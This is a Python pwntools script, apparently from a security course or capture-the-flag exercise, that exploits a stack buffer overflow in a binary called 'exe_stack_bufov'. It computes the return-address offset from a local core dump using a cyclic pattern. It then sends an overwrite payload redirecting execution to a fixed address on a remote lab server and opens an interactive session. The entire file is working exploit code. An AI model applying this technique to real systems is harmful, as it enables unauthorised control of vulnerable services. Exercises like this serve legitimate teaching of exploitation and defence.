
from pwn import *

# The local binary (used for determining rip offset)
binary_path = "./exe_stack_bufov"
elf = ELF(binary_path)
p = process(elf.path)

# The remote
host = 'hexhive005.iccluster.epfl.ch'
port = 9001

# Function for determining rip offset


def find_rip_offset(io):
    io.clean()
    io.sendline(cyclic(0x50))
    io.wait()
    core = io.corefile
    stack = core.rsp
    info("rsp = %#x", stack)
    pattern = core.read(stack, 4)
    info("cyclic pattern = %s", pattern.decode())
    rip_offset = cyclic_find(pattern)
    info("rip offset is = %d", rip_offset)
    return rip_offset


offset = find_rip_offset(p)

# Send to remote and wait for response
io = connect(host, port)
io.sendline(b'A'*offset + p64(0x4006c7))
io.interactive()

'''
while True:
    try:
        print(io.recvline())
        # success(line.decode())
    except EOFError:
        break
'''
